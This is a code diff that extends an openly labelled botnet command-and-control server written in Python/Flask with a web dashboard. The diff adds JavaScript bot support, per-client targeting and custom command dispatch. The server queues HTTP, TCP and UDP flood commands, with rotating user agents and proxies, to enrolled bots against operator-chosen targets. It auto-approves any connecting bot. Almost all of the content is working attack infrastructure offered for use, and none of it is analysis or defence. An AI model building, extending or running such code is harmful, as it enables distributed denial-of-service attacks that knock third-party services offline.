@@ -1,13 +1,13 @@
 """
-ENHANCED BOTNET C2 SERVER - JAVA CLIENT COMPATIBLE
-==================================================
+ENHANCED BOTNET C2 SERVER - MULTI-CLIENT SUPPORT
+================================================
 Features:
 - Auto-approval system
 - Custom user agent management
 - Optional proxy support
 - Modern blue/black interface
 - Resource-friendly operations
-- Java client compatibility
+- Python, Java, JavaScript client compatibility
 - Improved error handling
 
 Run: python server.py [port]
@@ -45,9 +45,11 @@ user_agents: List[str] = [
     'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
     'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
     'Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1',
-    # Add simpler user agents for Java clients
+    # Add simpler user agents for different clients
     'Java-Bot-Client/1.0',
-    'Mozilla/5.0 (compatible; Java-Bot)'
+    'Mozilla/5.0 (compatible; Java-Bot)',
+    'JavaScript-Bot/1.0 (Node.js)',
+    'Python-Bot/3.0'
 ]
 proxy_list: List[str] = []
 
@@ -143,6 +145,7 @@ DASHBOARD_HTML = """
         .bot-item.online { border-color: #66bb6a; }
         .bot-item.java { border-color: #ff5722; background: rgba(255, 87, 34, 0.1); }
         .bot-item.python { border-color: #1976d2; background: rgba(25, 118, 210, 0.1); }
+        .bot-item.javascript { border-color: #f7df1e; background: rgba(247, 223, 30, 0.1); color: #000; }
         .status-indicator {
             display: inline-block;
             width: 10px;
@@ -162,6 +165,7 @@ DASHBOARD_HTML = """
         }
         .client-java { background: #ff5722; color: white; }
         .client-python { background: #1976d2; color: white; }
+        .client-javascript { background: #f7df1e; color: black; }
         .client-unknown { background: #546e7a; color: white; }
         .btn {
             background: #1976d2;
@@ -182,6 +186,10 @@ DASHBOARD_HTML = """
         }
         .btn-danger { background: #d32f2f; }
         .btn-danger:hover { background: #c62828; }
+        .btn-success { background: #2e7d32; }
+        .btn-success:hover { background: #1b5e20; }
+        .btn-warning { background: #f57c00; }
+        .btn-warning:hover { background: #ef6c00; }
         input, select, textarea, button {
             background: rgba(13, 27, 42, 0.8);
             border: 2px solid #1976d2;
@@ -239,6 +247,8 @@ DASHBOARD_HTML = """
         .warning { color: #ffa726; border-left-color: #ffa726; }
         .info { color: #42a5f5; border-left-color: #42a5f5; }
         .java-log { color: #ff5722; border-left-color: #ff5722; }
+        .python-log { color: #1976d2; border-left-color: #1976d2; }
+        .javascript-log { color: #f7df1e; border-left-color: #f7df1e; }
         ::-webkit-scrollbar { width: 8px; }
         ::-webkit-scrollbar-track { background: rgba(0,0,0,0.3); }
         ::-webkit-scrollbar-thumb { 
@@ -261,17 +271,39 @@ DASHBOARD_HTML = """
             font-size: 0.9em;
             border: 1px solid #1976d2;
         }
+        .quick-commands {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(150px, 1fr));
+            gap: 10px;
+            margin-bottom: 15px;
+        }
+        .client-stats {
+            display: flex;
+            justify-content: space-around;
+            margin-top: 10px;
+        }
+        .client-stat {
+            text-align: center;
+            padding: 10px;
+        }
+        .client-stat .count {
+            font-size: 2em;
+            font-weight: bold;
+        }
+        .client-stat.java .count { color: #ff5722; }
+        .client-stat.python .count { color: #1976d2; }
+        .client-stat.javascript .count { color: #f7df1e; }
     </style>
 </head>
 <body>
     <div class="header">
-        <h1>C2 CONTROL PANEL - JAVA & PYTHON CLIENTS</h1>
-        <p>Auto-Approval System | Multi-Client Support | Resource Optimized</p>
+        <h1>C2 CONTROL PANEL - MULTI-CLIENT SUPPORT</h1>
+        <p>Python | Java | JavaScript | Auto-Approval | Resource Optimized</p>
     </div>
 
     <div class="stats">
         <div class="stat-box">
-            <h3>ACTIVE BOTS</h3>
+            <h3>TOTAL BOTS</h3>
             <p id="approved-bots">0</p>
         </div>
         <div class="stat-box">
@@ -279,12 +311,30 @@ DASHBOARD_HTML = """
             <p id="online-bots">0</p>
         </div>
         <div class="stat-box">
-            <h3>JAVA CLIENTS</h3>
-            <p id="java-clients">0</p>
+            <h3>ACTIVE ATTACKS</h3>
+            <p id="active-attacks">0</p>
         </div>
         <div class="stat-box">
-            <h3>PYTHON CLIENTS</h3>
-            <p id="python-clients">0</p>
+            <h3>TOTAL COMMANDS</h3>
+            <p id="total-commands">0</p>
+        </div>
+    </div>
+
+    <div class="section">
+        <h2>CLIENT STATISTICS</h2>
+        <div class="client-stats">
+            <div class="client-stat python">
+                <div class="count" id="python-clients">0</div>
+                <div>Python</div>
+            </div>
+            <div class="client-stat java">
+                <div class="count" id="java-clients">0</div>
+                <div>Java</div>
+            </div>
+            <div class="client-stat javascript">
+                <div class="count" id="javascript-clients">0</div>
+                <div>JavaScript</div>
+            </div>
         </div>
     </div>
 
@@ -297,11 +347,17 @@ DASHBOARD_HTML = """
 
     <div class="section">
         <h2>QUICK COMMANDS</h2>
-        <div style="display: flex; gap: 10px; flex-wrap: wrap;">
-            <button onclick="sendPing()">PING ALL BOTS</button>
-            <button onclick="sendSysInfo()">GET SYSTEM INFO</button>
-            <button onclick="stopAllAttacks()" class="btn-danger">STOP ALL ATTACKS</button>
-            <button onclick="clearInactiveBots()">CLEAR INACTIVE BOTS</button>
+        <div class="quick-commands">
+            <button class="btn-success" onclick="sendPing()">PING ALL</button>
+            <button class="btn-warning" onclick="sendSysInfo()">SYSINFO</button>
+            <button class="btn-danger" onclick="stopAllAttacks()">STOP ALL</button>
+            <button onclick="clearInactiveBots()">CLEAR INACTIVE</button>
+            <button onclick="testAllClients()">TEST CLIENTS</button>
+        </div>
+        <div style="margin-top: 15px;">
+            <button onclick="sendCommandToAll('ping')" class="btn-success">Ping All</button>
+            <button onclick="sendCommandToAll('sysinfo')" class="btn-warning">SysInfo All</button>
+            <button onclick="sendCommandToAll('stop_all')" class="btn-danger">Stop All Attacks</button>
         </div>
     </div>
 
@@ -311,9 +367,10 @@ DASHBOARD_HTML = """
             <label>User Agents (one per line):</label>
             <textarea id="user-agents" placeholder="Mozilla/5.0 ..."></textarea>
         </div>
-        <div class="form-group">
-            <label>Add Java-compatible user agents:</label>
+        <div style="display: flex; gap: 10px; margin-bottom: 15px;">
             <button onclick="addJavaAgents()">ADD JAVA AGENTS</button>
+            <button onclick="addJavaScriptAgents()">ADD JS AGENTS</button>
+            <button onclick="addPythonAgents()">ADD PYTHON AGENTS</button>
         </div>
         <button onclick="updateUserAgents()">UPDATE USER AGENTS</button>
     </div>
@@ -337,7 +394,7 @@ user:pass@5.6.7.8:8080"></textarea>
         <div class="form-group">
             <label>Threads per Bot (50-300):</label>
             <input type="number" id="http-threads" value="100" min="50" max="300">
-            <small>This will be sent to both Java and Python clients</small>
+            <small>This exact thread count will be sent to ALL clients</small>
         </div>
         <div class="form-group">
             <label>Duration (seconds):</label>
@@ -355,11 +412,12 @@ user:pass@5.6.7.8:8080"></textarea>
             <label>Target Client Type:</label>
             <select id="http-client-type">
                 <option value="all">All Clients</option>
-                <option value="java">Java Clients Only</option>
-                <option value="python">Python Clients Only</option>
+                <option value="python">Python Clients</option>
+                <option value="java">Java Clients</option>
+                <option value="javascript">JavaScript Clients</option>
             </select>
         </div>
-        <button onclick="launchHTTPFlood()">LAUNCH HTTP FLOOD</button>
+        <button onclick="launchHTTPFlood()" class="btn-danger">LAUNCH HTTP FLOOD</button>
         <div id="http-preview" class="command-preview" style="display: none;">
             <strong>Command Preview:</strong> Will be shown here...
         </div>
@@ -383,11 +441,12 @@ user:pass@5.6.7.8:8080"></textarea>
             <label>Target Client Type:</label>
             <select id="tcp-client-type">
                 <option value="all">All Clients</option>
-                <option value="java">Java Clients Only</option>
-                <option value="python">Python Clients Only</option>
+                <option value="python">Python Clients</option>
+                <option value="java">Java Clients</option>
+                <option value="javascript">JavaScript Clients</option>
             </select>
         </div>
-        <button onclick="launchTCPFlood()">LAUNCH TCP FLOOD</button>
+        <button onclick="launchTCPFlood()" class="btn-danger">LAUNCH TCP FLOOD</button>
     </div>
 
     <div class="section">
@@ -408,11 +467,12 @@ user:pass@5.6.7.8:8080"></textarea>
             <label>Target Client Type:</label>
             <select id="udp-client-type">
                 <option value="all">All Clients</option>
-                <option value="java">Java Clients Only</option>
-                <option value="python">Python Clients Only</option>
+                <option value="python">Python Clients</option>
+                <option value="java">Java Clients</option>
+                <option value="javascript">JavaScript Clients</option>
             </select>
         </div>
-        <button onclick="launchUDPFlood()">LAUNCH UDP FLOOD</button>
+        <button onclick="launchUDPFlood()" class="btn-danger">LAUNCH UDP FLOOD</button>
     </div>
 
     <div class="section">
@@ -429,10 +489,42 @@ user:pass@5.6.7.8:8080"></textarea>
             <label>Test Threads:</label>
             <input type="number" id="test-threads" value="20" min="10" max="50">
         </div>
-        <button onclick="sendTestCommand()">SEND TEST COMMAND</button>
+        <div class="form-group">
+            <label>Target Client Type:</label>
+            <select id="test-client-type">
+                <option value="all">All Clients</option>
+                <option value="python">Python Clients</option>
+                <option value="java">Java Clients</option>
+                <option value="javascript">JavaScript Clients</option>
+            </select>
+        </div>
+        <button onclick="sendTestCommand()" class="btn-warning">SEND TEST COMMAND</button>
         <small style="color: #90caf9; display: block; margin-top: 10px;">
             Note: Test commands use httpbin.org for safe testing
         </small>
+    </div>
+
+    <div class="section">
+        <h2>CLIENT MANAGEMENT</h2>
+        <div class="form-group">
+            <label>Select Client Type to Target:</label>
+            <select id="target-client-type" onchange="updateTargetedCommands()">
+                <option value="all">All Clients</option>
+                <option value="python">Python Only</option>
+                <option value="java">Java Only</option>
+                <option value="javascript">JavaScript Only</option>
+            </select>
+        </div>
+        <div class="quick-commands">
+            <button onclick="sendTargetedPing()">PING SELECTED</button>
+            <button onclick="sendTargetedSysInfo()">SYSINFO SELECTED</button>
+            <button onclick="sendTargetedStop()">STOP SELECTED</button>
+        </div>
+        <div class="form-group">
+            <label>Custom Command (JSON):</label>
+            <textarea id="custom-command" placeholder='{"type": "ping"}'>{"type": "ping"}</textarea>
+        </div>
+        <button onclick="sendCustomCommand()">SEND CUSTOM COMMAND</button>
     </div>
 
     <div class="section">
@@ -440,36 +532,198 @@ user:pass@5.6.7.8:8080"></textarea>
         <div style="margin-bottom: 10px;">
             <button onclick="clearLogs()">CLEAR LOGS</button>
             <button onclick="exportLogs()">EXPORT LOGS</button>
+            <button onclick="toggleAutoScroll()" id="auto-scroll-btn">AUTO SCROLL: ON</button>
         </div>
         <div id="logs" class="log"></div>
     </div>
 
     <script>
-        function getClientType(botId) {
-            // Check if bot is Java or Python based on user agent or other characteristics
-            const bot = window.currentBots?.find(b => b.bot_id === botId);
-            if (!bot) return 'unknown';
+        let autoScroll = true;
+        
+        function toggleAutoScroll() {
+            autoScroll = !autoScroll;
+            document.getElementById('auto-scroll-btn').textContent = 'AUTO SCROLL: ' + (autoScroll ? 'ON' : 'OFF');
+        }
+
+        function addJavaAgents() {
+            const textarea = document.getElementById('user-agents');
+            const javaAgents = [
+                'Java-Bot-Client/1.0',
+                'Mozilla/5.0 (compatible; Java-Bot)',
+                'Java-HTTP-Client/1.8',
+                'Mozilla/5.0 (Java; U; en-US)'
+            ];
+            addAgents(javaAgents);
+        }
+
+        function addJavaScriptAgents() {
+            const jsAgents = [
+                'JavaScript-Bot/1.0 (Node.js)',
+                'Node.js Bot Client',
+                'Mozilla/5.0 (compatible; JS-Bot)',
+                'JS-HTTP-Client/1.0'
+            ];
+            addAgents(jsAgents);
+        }
+
+        function addPythonAgents() {
+            const pythonAgents = [
+                'Python-Bot/3.0',
+                'Python-Requests/2.28',
+                'Mozilla/5.0 (compatible; Python-Bot)',
+                'Python-HTTP-Client/1.0'
+            ];
+            addAgents(pythonAgents);
+        }
+
+        function addAgents(agents) {
+            const textarea = document.getElementById('user-agents');
+            let current = textarea.value;
+            if (current && !current.endsWith('\n')) {
+                current += '\n';
+            }
+            textarea.value = current + agents.join('\n');
+        }
+
+        function updateTargetedCommands() {
+            const clientType = document.getElementById('target-client-type').value;
+            document.getElementById('http-client-type').value = clientType;
+            document.getElementById('tcp-client-type').value = clientType;
+            document.getElementById('udp-client-type').value = clientType;
+            document.getElementById('test-client-type').value = clientType;
+        }
+
+        function sendTargetedPing() {
+            const clientType = document.getElementById('target-client-type').value;
+            fetch('/api/command/ping', {
+                method: 'POST',
+                headers: {'Content-Type': 'application/json'},
+                body: JSON.stringify({ client_type: clientType })
+            })
+            .then(r => r.json())
+            .then(data => {
+                alert(`Ping sent to ${data.sent_count || 0} ${clientType} clients`);
+                updateStats();
+            })
+            .catch(err => {
+                console.error('Error:', err);
+                alert('Failed to send ping');
+            });
+        }
+
+        function sendTargetedSysInfo() {
+            const clientType = document.getElementById('target-client-type').value;
+            fetch('/api/command/sysinfo', {
+                method: 'POST',
+                headers: {'Content-Type': 'application/json'},
+                body: JSON.stringify({ client_type: clientType })
+            })
+            .then(r => r.json())
+            .then(data => {
+                alert(`Sysinfo sent to ${data.sent_count || 0} ${clientType} clients`);
+                updateStats();
+            })
+            .catch(err => {
+                console.error('Error:', err);
+                alert('Failed to send sysinfo');
+            });
+        }
+
+        function sendTargetedStop() {
+            const clientType = document.getElementById('target-client-type').value;
+            if(confirm(`Stop all attacks on ${clientType} clients?`)) {
+                fetch('/api/command/stop', {
+                    method: 'POST',
+                    headers: {'Content-Type': 'application/json'},
+                    body: JSON.stringify({ client_type: clientType })
+                })
+                .then(r => r.json())
+                .then(data => {
+                    alert(`Stop command sent to ${data.sent_count || 0} ${clientType} clients`);
+                    updateStats();
+                })
+                .catch(err => {
+                    console.error('Error:', err);
+                    alert('Failed to send stop command');
+                });
+            }
+        }
+
+        function sendCustomCommand() {
+            const commandText = document.getElementById('custom-command').value;
+            const clientType = document.getElementById('target-client-type').value;
             
-            const specs = bot.specs || {};
-            const status = bot.status || '';
+            try {
+                const command = JSON.parse(commandText);
+                fetch('/api/command/custom', {
+                    method: 'POST',
+                    headers: {'Content-Type': 'application/json'},
+                    body: JSON.stringify({ 
+                        command: command,
+                        client_type: clientType 
+                    })
+                })
+                .then(r => r.json())
+                .then(data => {
+                    alert(`Custom command sent to ${data.sent_count || 0} ${clientType} clients`);
+                    updateStats();
+                })
+                .catch(err => {
+                    console.error('Error:', err);
+                    alert('Failed to send custom command');
+                });
+            } catch (e) {
+                alert('Invalid JSON: ' + e.message);
+            }
+        }
+
+        function testAllClients() {
+            if(confirm('Send test command to all online clients?')) {
+                fetch('/api/command/test', {
+                    method: 'POST',
+                    headers: {'Content-Type': 'application/json'},
+                    body: JSON.stringify({ 
+                        target: 'https://httpbin.org/get',
+                        duration: 5,
+                        threads: 10 
+                    })
+                })
+                .then(r => r.json())
+                .then(data => {
+                    alert(`Test command sent to ${data.sent_count || 0} clients`);
+                    updateStats();
+                })
+                .catch(err => {
+                    console.error('Error:', err);
+                    alert('Failed to send test command');
+                });
+            }
+        }
+
+        function sendCommandToAll(commandType) {
+            const clientType = 'all';
+            const endpoint = commandType === 'ping' ? '/api/command/ping' :
+                           commandType === 'sysinfo' ? '/api/command/sysinfo' :
+                           '/api/command/stop';
             
-            // Check for Java indicators
-            if (specs.client_type === 'java' || 
-                (specs.capabilities && specs.capabilities.java === true) ||
-                status.includes('Java') ||
-                (specs.user_agent && specs.user_agent.includes('Java'))) {
-                return 'java';
+            if (commandType === 'stop_all' && !confirm('Stop all attacks on all clients?')) {
+                return;
             }
             
-            // Check for Python indicators
-            if (specs.client_type === 'python' || 
-                (specs.capabilities && specs.capabilities.python === true) ||
-                status.includes('Python') ||
-                (specs.user_agent && specs.user_agent.includes('Python'))) {
-                return 'python';
-            }
-            
-            return 'unknown';
+            fetch(endpoint, {
+                method: 'POST',
+                headers: {'Content-Type': 'application/json'},
+                body: JSON.stringify({ client_type: clientType })
+            })
+            .then(r => r.json())
+            .then(data => {
+                alert(`${commandType} sent to ${data.sent_count || 0} clients`);
+                updateStats();
+            })
+            .catch(err => {
+                console.error('Error:', err);
+                alert('Failed to send command');
+            });
         }
 
         function removeBot(botId) {
@@ -482,22 +736,6 @@ user:pass@5.6.7.8:8080"></textarea>
                     })
                     .catch(err => console.error('Error:', err));
             }
-        }
-
-        function addJavaAgents() {
-            const textarea = document.getElementById('user-agents');
-            const javaAgents = [
-                'Java-Bot-Client/1.0',
-                'Mozilla/5.0 (compatible; Java-Bot)',
-                'Java-HTTP-Client/1.8',
-                'Mozilla/5.0 (Java; U; en-US)'
-            ];
-            
-            let current = textarea.value;
-            if (current && !current.endsWith('\n')) {
-                current += '\n';
-            }
-            textarea.value = current + javaAgents.join('\n');
         }
 
         function updateUserAgents() {
@@ -554,8 +792,12 @@ user:pass@5.6.7.8:8080"></textarea>
                 .then(data => {
                     document.getElementById('approved-bots').textContent = data.approved_bots;
                     document.getElementById('online-bots').textContent = data.online_bots;
-                    document.getElementById('java-clients').textContent = data.java_clients;
+                    document.getElementById('active-attacks').textContent = data.active_attacks;
+                    document.getElementById('total-commands').textContent = data.total_commands || 0;
+                    
                     document.getElementById('python-clients').textContent = data.python_clients;
+                    document.getElementById('java-clients').textContent = data.java_clients;
+                    document.getElementById('javascript-clients').textContent = data.javascript_clients;
                     
                     document.getElementById('user-agents').value = data.user_agents.join('\\n');
                     document.getElementById('proxies').value = data.proxies.join('\\n');
@@ -599,6 +841,10 @@ user:pass@5.6.7.8:8080"></textarea>
                             const logClass = log.client_type ? `${log.type} ${log.client_type}-log` : log.type;
                             return `<div class="log-entry ${logClass}">[${log.time}] ${log.message}</div>`;
                         }).join('');
+                        
+                        if (autoScroll) {
+                            logsDiv.scrollTop = logsDiv.scrollHeight;
+                        }
                     }
                 })
                 .catch(err => console.error('Error fetching stats:', err));
@@ -616,20 +862,22 @@ user:pass@5.6.7.8:8080"></textarea>
                 return;
             }
             
-            fetch('/api/attack/http', {
-                method: 'POST',
-                headers: {'Content-Type': 'application/json'},
-                body: JSON.stringify({ target, duration, threads, method, client_type: clientType })
-            })
-            .then(r => r.json())
-            .then(data => {
-                alert(data.message);
-                updateStats();
-            })
-            .catch(err => {
-                console.error('Error:', err);
-                alert('Failed to launch attack');
-            });
+            if(confirm(`Launch HTTP ${method} flood with ${threads} threads to ${target} for ${duration}s on ${clientType} clients?`)) {
+                fetch('/api/attack/http', {
+                    method: 'POST',
+                    headers: {'Content-Type': 'application/json'},
+                    body: JSON.stringify({ target, duration, threads, method, client_type: clientType })
+                })
+                .then(r => r.json())
+                .then(data => {
+                    alert(data.message);
+                    updateStats();
+                })
+                .catch(err => {
+                    console.error('Error:', err);
+                    alert('Failed to launch attack');
+                });
+            }
         }
 
         function launchTCPFlood() {
@@ -643,20 +891,22 @@ user:pass@5.6.7.8:8080"></textarea>
                 return;
             }
             
-            fetch('/api/attack/tcp', {
-                method: 'POST',
-                headers: {'Content-Type': 'application/json'},
-                body: JSON.stringify({ target, duration, threads, client_type: clientType })
-            })
-            .then(r => r.json())
-            .then(data => {
-                alert(data.message);
-                updateStats();
-            })
-            .catch(err => {
-                console.error('Error:', err);
-                alert('Failed to launch attack');
-            });
+            if(confirm(`Launch TCP flood with ${threads} threads to ${target} for ${duration}s on ${clientType} clients?`)) {
+                fetch('/api/attack/tcp', {
+                    method: 'POST',
+                    headers: {'Content-Type': 'application/json'},
+                    body: JSON.stringify({ target, duration, threads, client_type: clientType })
+                })
+                .then(r => r.json())
+                .then(data => {
+                    alert(data.message);
+                    updateStats();
+                })
+                .catch(err => {
+                    console.error('Error:', err);
+                    alert('Failed to launch attack');
+                });
+            }
         }
 
         function launchUDPFlood() {
@@ -670,31 +920,34 @@ user:pass@5.6.7.8:8080"></textarea>
                 return;
             }
             
-            fetch('/api/attack/udp', {
-                method: 'POST',
-                headers: {'Content-Type': 'application/json'},
-                body: JSON.stringify({ target, duration, threads, client_type: clientType })
-            })
-            .then(r => r.json())
-            .then(data => {
-                alert(data.message);
-                updateStats();
-            })
-            .catch(err => {
-                console.error('Error:', err);
-                alert('Failed to launch attack');
-            });
+            if(confirm(`Launch UDP flood with ${threads} threads to ${target} for ${duration}s on ${clientType} clients?`)) {
+                fetch('/api/attack/udp', {
+                    method: 'POST',
+                    headers: {'Content-Type': 'application/json'},
+                    body: JSON.stringify({ target, duration, threads, client_type: clientType })
+                })
+                .then(r => r.json())
+                .then(data => {
+                    alert(data.message);
+                    updateStats();
+                })
+                .catch(err => {
+                    console.error('Error:', err);
+                    alert('Failed to launch attack');
+                });
+            }
         }
 
         function sendTestCommand() {
             const target = document.getElementById('test-target').value || 'https://httpbin.org/get';
             const duration = document.getElementById('test-duration').value;
             const threads = document.getElementById('test-threads').value;
+            const clientType = document.getElementById('test-client-type').value;
             
             fetch('/api/command/test', {
                 method: 'POST',
                 headers: {'Content-Type': 'application/json'},
-                body: JSON.stringify({ target, duration, threads })
+                body: JSON.stringify({ target, duration, threads, client_type: clientType })
             })
             .then(r => r.json())
             .then(data => {
@@ -796,7 +1049,7 @@ user:pass@5.6.7.8:8080"></textarea>
                     <strong>Command Preview:</strong><br>
                     Type: http_flood<br>
                     Target: ${httpTarget.value}<br>
-                    Threads: ${httpThreads.value} (will be sent to clients)<br>
+                    Threads: ${httpThreads.value} (EXACT value sent to clients)<br>
                     Method: ${document.getElementById('http-method').value}<br>
                     Duration: ${document.getElementById('http-duration').value}s<br>
                     Client Type: ${document.getElementById('http-client-type').value}
@@ -865,7 +1118,7 @@ def detect_client_type(specs: Dict) -> str:
         
         # Check user agent or other indicators
         user_agent = specs.get('user_agent', '').lower()
-        if 'javascript' in user_agent or 'node' in user_agent:
+        if 'javascript' in user_agent or 'node' in user_agent or 'js' in user_agent:
             return 'javascript'
         elif 'java' in user_agent or 'jdk' in user_agent:
             return 'java'
@@ -876,6 +1129,8 @@ def detect_client_type(specs: Dict) -> str:
         os_info = str(specs.get('os', '')).lower()
         if 'node' in os_info or 'js' in os_info:
             return 'javascript'
+        elif 'java' in os_info:
+            return 'java'
         
         return 'unknown'
     except:
@@ -908,7 +1163,8 @@ def check_approval():
                     'status': 'connected',
                     'approved_at': current_time,
                     'client_type': client_type,
-                    'stats': data.get('stats', {})
+                    'stats': data.get('stats', {}),
+                    'commands_received': 0
                 }
                 
                 log_message = f'Bot connected: {bot_id} - {client_type.upper()} client - {specs.get("os", "unknown")}'
@@ -942,6 +1198,10 @@ def get_commands(bot_id):
         with queue_lock:
             commands = commands_queue.get(bot_id, [])
             commands_queue[bot_id] = []  # Clear commands after sending
+            
+            # Update command count
+            if bot_id in approved_bots and commands:
+                approved_bots[bot_id]['commands_received'] = approved_bots[bot_id].get('commands_received', 0) + len(commands)
         
         return jsonify({'commands': commands})
     except Exception as e:
@@ -1099,7 +1359,9 @@ def get_stats():
         online_bots = 0
         java_clients = 0
         python_clients = 0
+        javascript_clients = 0
         active_attacks = 0
+        total_commands = 0
         
         with bot_lock:
             # Mark offline bots and count statistics
@@ -1117,6 +1379,11 @@ def get_stats():
                         java_clients += 1
                     elif client_type == 'python':
                         python_clients += 1
+                    elif client_type == 'javascript':
+                        javascript_clients += 1
+                    
+                    # Count total commands
+                    total_commands += info.get('commands_received', 0)
                 elif info.get('status') != 'offline':
                     info['status'] = 'offline'
         
@@ -1142,7 +1409,9 @@ def get_stats():
             'online_bots': online_bots,
             'java_clients': java_clients,
             'python_clients': python_clients,
+            'javascript_clients': javascript_clients,
             'active_attacks': active_attacks,
+            'total_commands': total_commands,
             'user_agents_count': len(user_agents),
             'approved': approved_list,
             'logs': recent_logs,
@@ -1158,7 +1427,9 @@ def get_stats():
             'online_bots': 0,
             'java_clients': 0,
             'python_clients': 0,
+            'javascript_clients': 0,
             'active_attacks': 0,
+            'total_commands': 0,
             'user_agents_count': 0,
             'approved': [],
             'logs': [],
@@ -1184,6 +1455,8 @@ def filter_bots_by_client_type(client_type_filter: str) -> List[str]:
             elif client_type_filter == 'java' and bot_client_type == 'java':
                 filtered_bots.append(bot_id)
             elif client_type_filter == 'python' and bot_client_type == 'python':
+                filtered_bots.append(bot_id)
+            elif client_type_filter == 'javascript' and bot_client_type == 'javascript':
                 filtered_bots.append(bot_id)
     
     return filtered_bots
@@ -1217,7 +1490,7 @@ def launch_http_attack():
                     'type': 'http_flood',
                     'target': target,
                     'duration': duration,
-                    'threads': threads,  # Server-defined threads sent to client
+                    'threads': threads,  # EXACT thread count sent to client
                     'method': method,
                     'user_agents': user_agents,
                     'proxies': proxy_list
@@ -1233,7 +1506,7 @@ def launch_http_attack():
         log_activity(log_message, 'warning', client_type_filter if client_type_filter != 'all' else None)
         
         print(f"[+] {log_message}")
-        return jsonify({'status': 'success', 'message': f'HTTP flood sent to {sent_count} bots ({client_type_display})'})
+        return jsonify({'status': 'success', 'message': f'HTTP flood sent to {sent_count} bots ({client_type_display})', 'sent_count': sent_count})
     except Exception as e:
         error_msg = f'Error in launch_http_attack: {str(e)}'
         log_activity(error_msg, 'error')
@@ -1268,7 +1541,7 @@ def launch_tcp_attack():
                     'type': 'tcp_flood',
                     'target': target,
                     'duration': duration,
-                    'threads': threads  # Server-defined threads sent to client
+                    'threads': threads  # EXACT thread count sent to client
                 }
                 
                 if bot_id not in commands_queue:
@@ -1281,7 +1554,7 @@ def launch_tcp_attack():
         log_activity(log_message, 'warning', client_type_filter if client_type_filter != 'all' else None)
         
         print(f"[+] {log_message}")
-        return jsonify({'status': 'success', 'message': f'TCP flood sent to {sent_count} bots ({client_type_display})'})
+        return jsonify({'status': 'success', 'message': f'TCP flood sent to {sent_count} bots ({client_type_display})', 'sent_count': sent_count})
     except Exception as e:
         error_msg = f'Error in launch_tcp_attack: {str(e)}'
         log_activity(error_msg, 'error')
@@ -1316,7 +1589,7 @@ def launch_udp_attack():
                     'type': 'udp_flood',
                     'target': target,
                     'duration': duration,
-                    'threads': threads  # Server-defined threads sent to client
+                    'threads': threads  # EXACT thread count sent to client
                 }
                 
                 if bot_id not in commands_queue:
@@ -1329,7 +1602,7 @@ def launch_udp_attack():
         log_activity(log_message, 'warning', client_type_filter if client_type_filter != 'all' else None)
         
         print(f"[+] {log_message}")
-        return jsonify({'status': 'success', 'message': f'UDP flood sent to {sent_count} bots ({client_type_display})'})
+        return jsonify({'status': 'success', 'message': f'UDP flood sent to {sent_count} bots ({client_type_display})', 'sent_count': sent_count})
     except Exception as e:
         error_msg = f'Error in launch_udp_attack: {str(e)}'
         log_activity(error_msg, 'error')
@@ -1338,9 +1611,12 @@ def launch_udp_attack():
 
 @app.route('/api/command/ping', methods=['POST'])
 def send_ping():
-    """Send ping to all bots"""
+    """Send ping to bots"""
     try:
-        target_bots = filter_bots_by_client_type('all')
+        data = request.json
+        client_type_filter = data.get('client_type', 'all') if data else 'all'
+        
+        target_bots = filter_bots_by_client_type(client_type_filter)
         
         if not target_bots:
             return jsonify({'status': 'error', 'message': 'No online bots available'}), 400
@@ -1356,9 +1632,10 @@ def send_ping():
                 commands_queue[bot_id].append(command)
                 sent_count += 1
         
-        log_activity(f'Ping sent to {sent_count} bots', 'success')
-        print(f"[+] Ping sent to {sent_count} bots")
-        return jsonify({'status': 'success', 'message': f'Ping sent to {sent_count} bots'})
+        client_type_display = 'all' if client_type_filter == 'all' else f'{client_type_filter} clients'
+        log_activity(f'Ping sent to {sent_count} {client_type_display}', 'success')
+        print(f"[+] Ping sent to {sent_count} {client_type_display}")
+        return jsonify({'status': 'success', 'message': f'Ping sent to {sent_count} {client_type_display}', 'sent_count': sent_count})
     except Exception as e:
         error_msg = f'Error in send_ping: {str(e)}'
         log_activity(error_msg, 'error')
@@ -1369,7 +1646,10 @@ def send_ping():
 def send_sysinfo():
     """Request system info from bots"""
     try:
-        target_bots = filter_bots_by_client_type('all')
+        data = request.json
+        client_type_filter = data.get('client_type', 'all') if data else 'all'
+        
+        target_bots = filter_bots_by_client_type(client_type_filter)
         
         if not target_bots:
             return jsonify({'status': 'error', 'message': 'No online bots available'}), 400
@@ -1385,9 +1665,10 @@ def send_sysinfo():
                 commands_queue[bot_id].append(command)
                 sent_count += 1
         
-        log_activity(f'Sysinfo request sent to {sent_count} bots', 'success')
-        print(f"[+] Sysinfo sent to {sent_count} bots")
-        return jsonify({'status': 'success', 'message': f'Sysinfo request sent to {sent_count} bots'})
+        client_type_display = 'all' if client_type_filter == 'all' else f'{client_type_filter} clients'
+        log_activity(f'Sysinfo request sent to {sent_count} {client_type_display}', 'success')
+        print(f"[+] Sysinfo sent to {sent_count} {client_type_display}")
+        return jsonify({'status': 'success', 'message': f'Sysinfo request sent to {sent_count} {client_type_display}', 'sent_count': sent_count})
     except Exception as e:
         error_msg = f'Error in send_sysinfo: {str(e)}'
         log_activity(error_msg, 'error')
@@ -1396,9 +1677,12 @@ def send_sysinfo():
 
 @app.route('/api/command/stop', methods=['POST'])
 def send_stop_all():
-    """Stop all attacks on all bots"""
+    """Stop all attacks on bots"""
     try:
-        target_bots = filter_bots_by_client_type('all')
+        data = request.json
+        client_type_filter = data.get('client_type', 'all') if data else 'all'
+        
+        target_bots = filter_bots_by_client_type(client_type_filter)
         
         if not target_bots:
             return jsonify({'status': 'error', 'message': 'No online bots available'}), 400
@@ -1414,9 +1698,10 @@ def send_stop_all():
                 commands_queue[bot_id].append(command)
                 sent_count += 1
         
-        log_activity(f'Stop all attacks command sent to {sent_count} bots', 'error')
-        print(f"[+] Stop command sent to {sent_count} bots")
-        return jsonify({'status': 'success', 'message': f'Stop command sent to {sent_count} bots'})
+        client_type_display = 'all' if client_type_filter == 'all' else f'{client_type_filter} clients'
+        log_activity(f'Stop all attacks command sent to {sent_count} {client_type_display}', 'error')
+        print(f"[+] Stop command sent to {sent_count} {client_type_display}")
